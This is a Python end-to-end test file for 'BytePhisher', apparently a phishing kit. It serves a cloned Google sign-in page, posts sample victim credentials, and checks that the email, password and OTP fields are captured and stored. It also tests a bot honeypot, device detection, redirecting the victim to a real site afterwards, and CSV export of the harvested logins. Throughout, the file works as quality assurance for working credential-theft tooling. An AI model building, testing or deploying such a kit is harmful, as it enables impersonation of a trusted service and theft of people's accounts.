#!/usr/bin/env python3
"""BytePhisher end-to-end self-test.

Starts the real HTTP server against the generated templates, drives a real
GET + POST over HTTP, then verifies the SQLite capture store actually holds
the captured fields. Run:  ./.venv/bin/python tests/test_e2e.py
"""
import os
import sys
import json
import time
import tempfile
import threading
import urllib.request
import urllib.parse

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)

from core import server as srv
from core import capture as cap
from dashboard import render_plain

TEMPLATES = os.path.join(HERE, "templates")
PORT = 8099
PASS, FAIL = [], []


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    print(f"  {'PASS' if cond else 'FAIL'}  {name}" + (f"  ({detail})" if detail else ""))


def main():
    tmpdb = os.path.join(tempfile.mkdtemp(), "test.db")
    site_dir = os.path.join(TEMPLATES, "03_google")
    print(f"\n[1] template dir: {site_dir}  exists={os.path.isdir(site_dir)}")
    check("template dir exists", os.path.isdir(site_dir))

    httpd, _ = srv.serve(TEMPLATES, site_dir, PORT, tmpdb, geo_provider="off")
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    time.sleep(0.6)

    # --- GET login page ---
    print("\n[2] GET / …")
    with urllib.request.urlopen(f"http://127.0.0.1:{PORT}/", timeout=5) as r:
        body = r.read().decode()
        check("GET / returns 200", r.status == 200, f"status={r.status}")
        check("page renders brand title", "Log in to Google" in body)
        check("email field present", 'name="email"' in body)
        check("password field present", 'name="password"' in body)
        check("honeypot field present", 'name="hp_email"' in body)
        check("template id embedded", 'name="_tpl" value="google"' in body)

    # --- GET unknown path still serves template (catch-all) ---
    with urllib.request.urlopen(f"http://127.0.0.1:{PORT}/auth/login", timeout=5) as r:
        check("catch-all path serves template", r.status == 200)

    # --- POST credentials ---
    print("\n[3] POST credentials …")
    data = urllib.parse.urlencode({
        "email": "victim@example.com", "password": "Sup3rSecret!",
        "hp_email": "", "_tpl": "google", "_ts": "4210",
    }).encode()
    req = urllib.request.Request(f"http://127.0.0.1:{PORT}/",
                                 data=data,
                                 headers={"Content-Type": "application/x-www-form-urlencoded",
                                          "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"})
    with urllib.request.urlopen(req, timeout=5) as r:
        check("POST returns 200", r.status == 200, f"status={r.status}")

    time.sleep(0.4)
    db = cap.CaptureDB(tmpdb)
    caps = db.all()
    check("capture row written", len(caps) == 1, f"rows={len(caps)}")
    if caps:
        c = caps[0]
        check("email captured", c["fields"].get("email") == "victim@example.com")
        check("password captured", c["fields"].get("password") == "Sup3rSecret!")
        check("credential flag set", c["is_cred"] is True)
        check("device detected = ios", c["device"] == "ios", f"got={c['device']}")
        print(f"      captured fields -> {json.dumps(c['fields'])}")
    st = db.stats()
    # page views (GET) also count as visitors now, so visitors >= captures
    check("stats counters", st["total_captures"] == 1 and st["credentials"] == 1 and st["visitors"] >= 1,
          str(st))

    # --- redirect mode ---
    print("\n[4] redirect-after-capture mode …")
    httpd2, _ = srv.serve(TEMPLATES, site_dir, PORT + 1, tmpdb, geo_provider="off",
                          redirect_url="https://example.com/after")
    threading.Thread(target=httpd2.serve_forever, daemon=True).start()
    time.sleep(0.5)
    req2 = urllib.request.Request(f"http://127.0.0.1:{PORT+1}/", data=data,
                                  headers={"Content-Type": "application/x-www-form-urlencoded"})

    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **kw):
            return None  # do not follow; surface the 302 itself

    opener = urllib.request.build_opener(_NoRedirect)
    try:
        with opener.open(req2, timeout=5) as r:
            status, loc = r.status, r.headers.get("Location")
    except urllib.error.HTTPError as e:
        status, loc = e.code, e.headers.get("Location")
    check("302 redirect issued", status == 302, f"status={status}")
    check("redirect target correct", loc == "https://example.com/after", f"loc={loc}")

    # --- OTP page ---
    print("\n[5] OTP page rendering …")
    from core import templates as tplmod
    otp_html = tplmod.render_site(site_dir, "/", otp=True)
    check("OTP page serves 6 code inputs", otp_html.count('name="otp_') == 6,
          f"count={otp_html.count('name=\"otp_')}")
    check("OTP page branded", "Google" in otp_html)

    # --- export + dashboard ---
    print("\n[6] export + dashboard …")
    csv_path = os.path.join(tempfile.mkdtemp(), "caps.csv")
    db.export_csv(csv_path)
    with open(csv_path) as f:
        content = f.read()
    check("CSV export contains credential row", "victim@example.com" in content)
    check("CSV export flags cred", "YES" in content)
    render_plain(db.all(), db.stats())
    check("plain dashboard renders", True)

    httpd.shutdown(); httpd2.shutdown()
    print("\n" + "=" * 58)
    print(f"  RESULT: {len(PASS)} passed, {len(FAIL)} failed")
    if FAIL:
        print("  FAILED: " + ", ".join(FAIL))
    print("=" * 58)
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
